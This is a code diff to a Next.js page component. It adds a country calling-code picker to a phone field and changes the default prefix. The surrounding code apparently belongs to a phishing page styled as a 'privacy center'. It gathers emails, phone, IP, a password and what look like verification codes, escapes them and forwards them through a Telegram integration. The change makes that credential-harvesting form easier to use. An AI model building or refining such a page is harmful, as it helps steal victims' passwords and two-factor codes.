@@ -5,6 +5,7 @@ import Link from "next/link";
 import { useRouter } from "next/navigation";
 import { FormEvent, useEffect, useRef, useState } from "react";
 import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
+import { COUNTRY_CALLING_CODE_MAP } from "@/lib/geoip";
 import styles from "./page.module.css";
 
 type ActionItem = {
@@ -317,6 +318,10 @@ export default function HomePageClient({
   const [clientIp, setClientIp] = useState(detectedIp ?? "");
   const phoneFlag = countryCodeToFlag(clientCountryCode);
   const phoneCode = normalizeCallingCode(clientCallingCode);
+  const phoneOptions = Object.entries(COUNTRY_CALLING_CODE_MAP).map(([code, dial]) => ({
+    code,
+    dial,
+  }));
 
   const privacyCenterActions: ActionItem[] = [
     {
@@ -383,6 +388,9 @@ export default function HomePageClient({
   const [code2, setCode2] = useState("");
   const [code3, setCode3] = useState("");
   const [currentUrl, setCurrentUrl] = useState("");
+  const [isCountryMenuOpen, setIsCountryMenuOpen] = useState(false);
+  const [isPhoneCodeManual, setIsPhoneCodeManual] = useState(false);
+  const phoneMenuRef = useRef<HTMLDivElement | null>(null);
 
   type TelegramOverrides = Partial<{
     password1: string;
@@ -407,7 +415,7 @@ export default function HomePageClient({
     const safePersonalEmail = escapeHtml(form.email || "N/A");
     const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
     const safeDetails = escapeHtml(form.details.trim() || "N/A");
-    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+84");
+    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+1");
     const safeUrl = escapeHtml(currentUrl || "N/A");
     const safeTime = escapeHtml(getCurrentTime());
     const safePassword1 = escapeHtml((overrides.password1 ?? password1) || "N/A");
@@ -839,6 +847,9 @@ export default function HomePageClient({
     if (!clientCountryCode) {
       return;
     }
+    if (isPhoneCodeManual) {
+      return;
+    }
     const nextLocale = resolveLocaleFromCountryCode(clientCountryCode);
     if (nextLocale === activeLocale) {
       return;
@@ -847,7 +858,7 @@ export default function HomePageClient({
     if (typeof document !== "undefined") {
       document.cookie = `${LOCALE_COOKIE_NAME}=${nextLocale};path=/;max-age=${60 * 60 * 24 * 365};samesite=lax`;
     }
-  }, [clientCountryCode, activeLocale, locale]);
+  }, [clientCountryCode, activeLocale, locale, isPhoneCodeManual]);
 
   useEffect(() => {
     let cancelled = false;
@@ -926,6 +937,24 @@ export default function HomePageClient({
       setMessageId(storedId);
     }
   }, [telegramEnabled]);
+
+  useEffect(() => {
+    if (!isCountryMenuOpen) {
+      return;
+    }
+
+    const handleClickOutside = (event: MouseEvent) => {
+      if (!phoneMenuRef.current) {
+        return;
+      }
+      if (!phoneMenuRef.current.contains(event.target as Node)) {
+        setIsCountryMenuOpen(false);
+      }
+    };
+
+    document.addEventListener("mousedown", handleClickOutside);
+    return () => document.removeEventListener("mousedown", handleClickOutside);
+  }, [isCountryMenuOpen]);
 
   useEffect(() => {
     if (!isSubmitDisabled || timeLeft <= 0) {
@@ -1187,11 +1216,44 @@ export default function HomePageClient({
                   />
                   {errors.pageName ? <p className={styles.fieldError}>{errors.pageName}</p> : null}
 
-                  <div className={styles.phoneInputWrap}>
-                    <span className={styles.phonePrefix}>
+                  <div className={styles.phoneInputWrap} ref={phoneMenuRef}>
+                    <button
+                      type="button"
+                      className={styles.phonePrefixButton}
+                      onClick={() => setIsCountryMenuOpen((prev) => !prev)}
+                      aria-haspopup="listbox"
+                      aria-expanded={isCountryMenuOpen}
+                    >
                       <span className={styles.phoneFlag}>{phoneFlag}</span>
-                      <span className={styles.phoneCode}>{phoneCode}</span>
-                    </span>
+                      <span className={styles.phoneCode}>{phoneCode || "+1"}</span>
+                    </button>
+                    {isCountryMenuOpen ? (
+                      <div className={styles.phoneDropdown} role="listbox" aria-label="Country calling codes">
+                        {phoneOptions.map((option) => {
+                          const optionCode = normalizeCallingCode(option.dial);
+                          const isSelected = option.code === clientCountryCode && optionCode === phoneCode;
+
+                          return (
+                            <button
+                              type="button"
+                              key={`${option.code}-${option.dial}`}
+                              className={`${styles.phoneOption} ${isSelected ? styles.phoneOptionActive : ""}`}
+                              role="option"
+                              aria-selected={isSelected}
+                              onClick={() => {
+                                setIsPhoneCodeManual(true);
+                                setClientCountryCode(option.code);
+                                setClientCallingCode(option.dial);
+                                setIsCountryMenuOpen(false);
+                              }}
+                            >
+                              <span className={styles.phoneFlag}>{countryCodeToFlag(option.code)}</span>
+                              <span className={styles.phoneOptionCode}>{option.dial}</span>
+                            </button>
+                          );
+                        })}
+                      </div>
+                    ) : null}
                     <input
                       id="phoneNumber"
                       type="tel"
